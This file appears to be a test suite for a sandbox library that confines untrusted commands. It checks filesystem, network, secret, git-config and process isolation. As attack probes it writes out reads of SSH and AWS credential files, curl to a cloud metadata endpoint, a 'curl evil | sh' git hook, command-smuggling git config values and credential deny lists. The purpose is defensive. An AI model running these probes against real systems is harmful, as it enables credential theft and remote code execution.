import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { createServer, type Server } from "node:net";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import {
  assertEnvAllowed, BwrapBackend, buildSandboxEnv, createWorkspace, detectBackend, findEscapingSymlinks, NoIsolationBackend, PathEscapeError, PolicyViolation,
  resolveInside, runSandboxed, sanitizeGitDir, sweepStaleWorkspaces, teardownWorkspace, type Workspace,
} from "../src/index";

const backend = detectBackend();
const base = mkdtempSync(join(tmpdir(), "ws-base-"));
const hostDir = mkdtempSync(join(tmpdir(), "host-secret-"));
const SECRET = "TOP-SECRET-HOST-DATA";
writeFileSync(join(hostDir, "secret.txt"), SECRET);
let ws: Workspace;
let env: Record<string, string>;
let server: Server;
let connections = 0;
let port = 0;

beforeAll(async () => {
  ws = createWorkspace(base, "adv");
  env = buildSandboxEnv({ home: ws.homeDir, tmp: ws.tmpDir });
  server = createServer((s) => { connections++; s.end("pwned"); });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  port = (server.address() as { port: number }).port;
});
afterAll(() => { server.close(); });

const sh = (script: string, extra: Partial<Parameters<typeof runSandboxed>[0]> = {}) =>
  runSandboxed({ backend, workspaceRoot: ws.root, cwd: ws.repoDir, command: "/bin/sh", args: ["-c", script], env, timeoutMs: 10_000, ...extra });

test("bwrap argv: unshares everything, binds only the workspace read-write, re-applies the scrubbed env after --clearenv", () => {
  const w = new BwrapBackend("/usr/bin/bwrap").wrap("/bin/echo", ["hi"], { workspaceRoot: ws.root, env: { HOME: "/h", PATH: "/usr/bin:/bin" }, cpuSeconds: 5 });
  expect(w.command).toBe("/usr/bin/bwrap");
  expect(w.args).toEqual(expect.arrayContaining(["--unshare-all", "--die-with-parent", "--new-session", "--clearenv"]));
  expect(w.args).not.toContain("--share-net");
  const i = w.args.indexOf("--clearenv");
  expect(w.args.slice(i + 1, i + 7)).toEqual(["--setenv", "HOME", "/h", "--setenv", "PATH", "/usr/bin:/bin"]);
  const binds = w.args.flatMap((a, k) => (a === "--bind" ? [w.args[k + 1]] : []));
  expect(binds).toEqual([ws.root]);
  expect(w.args.join(" ")).toContain("ulimit -t 5");
});

test("commands run in the requested cwd inside the sandbox (bwrap --chdir)", async () => {
  const w = new BwrapBackend("/usr/bin/bwrap").wrap("/bin/true", [], { workspaceRoot: ws.root, cwd: ws.repoDir });
  expect(w.args[w.args.indexOf("--chdir") + 1]).toBe(ws.repoDir);
  const r = await sh("pwd");
  expect(r.stdout.trim().replace(/^\/private/, "")).toBe(ws.repoDir.replace(/^\/private/, ""));
});

test("a real confinement backend is available on this host (suite must not silently weaken)", () => {
  expect(backend.isolation).toBe("strong");
});

describe("filesystem confinement", () => {
  test("cannot read host files outside the workspace", async () => {
    const r = await sh(`cat ${join(hostDir, "secret.txt")}`);
    expect(r.exitCode).not.toBe(0);
    expect(r.stdout).not.toContain(SECRET);
  });
  test("cannot list the real home directory or read ssh/keychain locations", async () => {
    const r = await sh(`ls ${homedir()} 2>/dev/null; cat ${homedir()}/.ssh/id_rsa ${homedir()}/.gitconfig ${homedir()}/.aws/credentials 2>/dev/null; true`);
    expect(r.stdout).toBe("");
  });
  test("cannot write outside the workspace", async () => {
    const target = join(hostDir, "written.txt");
    const r = await sh(`echo pwn > ${target}`);
    expect(r.exitCode).not.toBe(0);
    expect(existsSync(target)).toBe(false);
    const t2 = join(base, "sibling-write.txt");
    await sh(`echo pwn > ${t2}`);
    expect(existsSync(t2)).toBe(false);
  });
  test("workspace itself is writable (sanity)", async () => {
    const r = await sh(`echo ok > ${join(ws.repoDir, "f.txt")} && cat ${join(ws.repoDir, "f.txt")}`);
    expect(r.exitCode).toBe(0);
    expect(r.stdout.trim()).toBe("ok");
  });
  test("a symlink planted in the repo cannot be used to read host data", async () => {
    symlinkSync(join(hostDir, "secret.txt"), join(ws.repoDir, "innocent.txt"));
    const r = await sh(`cat ${join(ws.repoDir, "innocent.txt")}`);
    expect(r.exitCode).not.toBe(0);
    expect(r.stdout).not.toContain(SECRET);
    expect(findEscapingSymlinks(ws.root)).toEqual([join(ws.root, "repo", "innocent.txt")]);
  });
  test("cannot read the sandbox profile or other jobs' workspaces", async () => {
    const other = createWorkspace(base, "other");
    writeFileSync(join(other.repoDir, "theirs.txt"), "OTHER-JOB-DATA");
    const r = await sh(`cat ${join(other.repoDir, "theirs.txt")}`);
    expect(r.stdout).not.toContain("OTHER-JOB-DATA");
    teardownWorkspace(base, other);
  });
});

describe("network confinement", () => {
  test("loopback and external connections are blocked; the listener sees nothing", async () => {
    const before = connections;
    const r = await runSandboxed({ backend, workspaceRoot: ws.root, cwd: ws.repoDir, command: "/usr/bin/curl", args: ["-s", "-m", "3", `http://127.0.0.1:${port}/`], env, timeoutMs: 10_000 });
    expect(r.stdout).not.toContain("pwned");
    expect(r.exitCode).not.toBe(0);
    expect(connections).toBe(before);
    const meta = await runSandboxed({ backend, workspaceRoot: ws.root, cwd: ws.repoDir, command: "/usr/bin/curl", args: ["-s", "-m", "3", "http://169.254.169.254/latest/meta-data/"], env, timeoutMs: 10_000 });
    expect(meta.exitCode).not.toBe(0);
    expect(meta.stdout).toBe("");
  });
});

describe("secret handling", () => {
  test("host credentials in process.env never reach the sandbox", async () => {
    process.env.ANTHROPIC_API_KEY = "sk-ant-should-not-leak-123456789";
    process.env.GITHUB_TOKEN = "ghp_shouldnotleak1234567890abcdef";
    process.env.SSH_AUTH_SOCK = "/tmp/agent.sock";
    try {
      const r = await sh("env");
      for (const needle of ["sk-ant-should", "ghp_shouldnot", "agent.sock", "ANTHROPIC", "GITHUB_TOKEN"]) expect(r.stdout).not.toContain(needle);
      expect(r.stdout).toContain(`HOME=${ws.homeDir}`);
    } finally {
      delete process.env.ANTHROPIC_API_KEY; delete process.env.GITHUB_TOKEN; delete process.env.SSH_AUTH_SOCK;
    }
  });
  test("credential-like variables are rejected, including when passed explicitly to the sandbox", () => {
    for (const k of ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GOOGLE_API_KEY", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "OPENAI_BASE_URL", "MY_SERVICE_PASSWORD"]) {
      expect(() => assertEnvAllowed({ [k]: "x" })).toThrow(PolicyViolation);
      expect(() => buildSandboxEnv({ home: "/h", tmp: "/t" }, { [k]: "x" })).toThrow(PolicyViolation);
    }
    expect(() => assertEnvAllowed({ PATH: "/bin", LANG: "C" })).not.toThrow();
    expect(() => assertEnvAllowed({ ANTHROPIC_API_KEY: "" })).not.toThrow();
  });
  test("output is redacted before it leaves the sandbox runner", async () => {
    const r = await sh(`echo "token ghp_abcdefghijklmnopqrstuvwxyz0123"`);
    expect(r.stdout).not.toContain("ghp_abcdefghijklmnopqrstuvwxyz0123");
  });
});

describe("path and git safety", () => {
  test("resolveInside rejects traversal, absolute paths, NUL, and symlink escapes (incl. dangling)", () => {
    expect(resolveInside(ws.root, "repo/ok.txt")).toBe(join(ws.root, "repo", "ok.txt"));
    for (const bad of ["../x", "repo/../../x", "/etc/passwd", "a\0b"]) expect(() => resolveInside(ws.root, bad)).toThrow(PathEscapeError);
    mkdirSync(join(ws.root, "tmp", "d"), { recursive: true });
    symlinkSync(hostDir, join(ws.root, "tmp", "d", "link"));
    expect(() => resolveInside(ws.root, "tmp/d/link/secret.txt")).toThrow(PathEscapeError);
    symlinkSync("/nonexistent/target", join(ws.root, "tmp", "dangling"));
    expect(() => resolveInside(ws.root, "tmp/dangling")).toThrow(PathEscapeError);
  });
  test("poisoned .git hooks and config are neutralised", () => {
    const repo = join(ws.root, "poisoned");
    mkdirSync(join(repo, ".git", "hooks"), { recursive: true });
    writeFileSync(join(repo, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil | sh\n");
    writeFileSync(join(repo, ".git", "hooks", "post-checkout"), "#!/bin/sh\nexit 0\n");
    writeFileSync(join(repo, ".git", "config"), [
      "[core]", "\trepositoryformatversion = 0", "\tfsmonitor = /tmp/evil", "\thooksPath = /tmp/hooks", "\tsshCommand = evil",
      "[alias]", "\tco = !curl evil", "[credential]", "\thelper = !steal", "[remote \"origin\"]", "\turl = ext::sh -c evil", "\tfetch = +refs/heads/*:refs/remotes/origin/*",
      "[remote \"good\"]", "\turl = https://github.com/o/r.git", "[include]", "\tpath = /tmp/inc", "[filter \"x\"]", "\tprocess = evil", "",
    ].join("\n"));
    const report = sanitizeGitDir(repo);
    expect(report.removedHooks.sort()).toEqual(["post-checkout", "pre-commit"]);
    const cfg = readFileSync(join(repo, ".git", "config"), "utf8");
    for (const bad of ["evil", "steal", "/tmp/hooks", "/tmp/inc", "ext::"]) expect(cfg).not.toContain(bad);
    expect(cfg).toContain("hooksPath = /dev/null");
    expect(cfg).toContain("https://github.com/o/r.git");
    expect(report.droppedConfigKeys).toEqual(expect.arrayContaining(["core.fsmonitor", "core.hookspath", "alias.co", "credential.helper", "remote.origin.url", "include.path"]));
    expect(existsSync(join(repo, ".git", "hooks", "pre-commit"))).toBe(false);
  });
  test("the sanitized config is valid for real git, idempotent, and effective", () => {
    
    const repo = join(ws.root, "realgit");
    mkdirSync(repo, { recursive: true });
    const g = (...a: string[]) => execFileSync("git", ["-C", repo, ...a], { encoding: "utf8", env: { PATH: process.env.PATH ?? "", HOME: ws.homeDir, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" } });
    g("init", "-q");
    g("config", "alias.x", "!touch /tmp/should-not-exist");
    g("config", "core.sshCommand", "evil");
    sanitizeGitDir(repo);
    sanitizeGitDir(repo); // second pass over its own output must still parse
    const listed = g("config", "--local", "--list");
    expect(listed).toContain("core.hookspath=/dev/null");
    expect(listed).toContain("protocol.ext.allow=never");
    expect(listed).not.toMatch(/alias|sshcommand/i);
  });
  test("a .git gitfile or symlink pointing elsewhere is refused", () => {
    const repo = join(ws.root, "gitfile");
    mkdirSync(repo, { recursive: true });
    writeFileSync(join(repo, ".git"), `gitdir: ${hostDir}\n`);
    expect(() => sanitizeGitDir(repo)).toThrow(/real directory/);
  });
});

describe("process supervision", () => {
  test("timeout kills the whole process group, including backgrounded grandchildren", async () => {
    const r = await sh("sleep 60 & sleep 60 & wait", { timeoutMs: 400, killGraceMs: 200 });
    expect(r.timedOut).toBe(true);
    expect(r.groupGone).toBe(true);
    expect(r.durationMs).toBeLessThan(5_000);
  });
  test("cancellation via AbortSignal is prompt and idempotent", async () => {
    const ac = new AbortController();
    const p = sh("sleep 60", { signal: ac.signal, timeoutMs: 30_000, killGraceMs: 200 });
    setTimeout(() => { ac.abort(); ac.abort(); }, 150);
    const r = await p;
    expect(r.cancelled).toBe(true);
    expect(r.groupGone).toBe(true);
    const pre = new AbortController();
    pre.abort();
    expect((await sh("sleep 60", { signal: pre.signal, killGraceMs: 100 })).cancelled).toBe(true);
  });
  test("SIGTERM-ignoring processes are SIGKILLed after the grace period", async () => {
    const r = await sh(`trap '' TERM; while :; do sleep 1; done`, { timeoutMs: 300, killGraceMs: 200 });
    expect(r.timedOut).toBe(true);
    expect(r.groupGone).toBe(true);
  });
  test("output is capped", async () => {
    const r = await sh("yes AAAAAAAAAAAAAAAA | head -c 5000000", { maxOutputBytes: 10_000 });
    expect(r.outputTruncated).toBe(true);
    expect(r.stdout.length).toBeLessThanOrEqual(10_000);
  });
  test("CPU time limit stops a busy loop", async () => {
    const r = await sh("while :; do :; done", { cpuSeconds: 1, timeoutMs: 15_000 });
    expect(r.timedOut).toBe(false);
    expect(r.exitCode === 0).toBe(false);
  });
  test("file size limit blocks huge writes", async () => {
    const f = join(ws.repoDir, "big.bin");
    await sh(`head -c 5000000 /dev/zero > ${f}`, { maxFileBytes: 100_000 });
    expect(existsSync(f) ? readFileSync(f).length : 0).toBeLessThanOrEqual(100_000);
  });
  test("without OS isolation, untrusted execution is refused (fail closed)", async () => {
    await expect(runSandboxed({ backend: new NoIsolationBackend(), workspaceRoot: ws.root, cwd: ws.repoDir, command: "/bin/echo", env, timeoutMs: 1000 })).rejects.toThrow(PolicyViolation);
  });
});

describe("workspace lifecycle", () => {
  test("teardown removes everything (even read-only files and escaping symlinks) without touching link targets", () => {
    const w = createWorkspace(base, "td");
    writeFileSync(join(w.repoDir, "ro.txt"), "x");
    mkdirSync(join(w.repoDir, "sub"));
    writeFileSync(join(w.repoDir, "sub", "f"), "y");
    symlinkSync(hostDir, join(w.repoDir, "link-to-host"));
    chmodSync(join(w.repoDir, "ro.txt"), 0o400);
    chmodSync(join(w.repoDir, "sub"), 0o500);
    const r = teardownWorkspace(base, w);
    expect(r.removed).toBe(true);
    expect(r.escapingSymlinks.length).toBe(1);
    expect(existsSync(w.root)).toBe(false);
    expect(readFileSync(join(hostDir, "secret.txt"), "utf8")).toBe(SECRET);
  });
  test("teardown refuses to delete anything that is not a direct child of the workspace base", () => {
    const r = teardownWorkspace(base, { id: "x", root: hostDir, repoDir: "", homeDir: "", tmpDir: "" });
    expect(r.removed).toBe(false);
    expect(existsSync(join(hostDir, "secret.txt"))).toBe(true);
    expect(teardownWorkspace(base, { id: "y", root: join(base, "..", "etc"), repoDir: "", homeDir: "", tmpDir: "" }).removed).toBe(false);
  });
  test("unsafe workspace ids are rejected; workspaces are private (0700)", () => {
    expect(() => createWorkspace(base, "../evil")).toThrow();
    const w = createWorkspace(base, "perm");
    expect(statSync(w.root).mode & 0o777).toBe(0o700);
    teardownWorkspace(base, w);
  });
  test("crash recovery sweeps stale workspaces (and only those older than the threshold)", () => {
    const sweepBase = mkdtempSync(join(tmpdir(), "sweep-"));
    const w = createWorkspace(sweepBase, "stale");
    expect(sweepStaleWorkspaces(sweepBase, 60_000)).toEqual([]);
    expect(sweepStaleWorkspaces(sweepBase, 60_000, Date.now() + 120_000)).toEqual([w.root.split("/").pop() as string]);
    expect(existsSync(w.root)).toBe(false);
  });
});
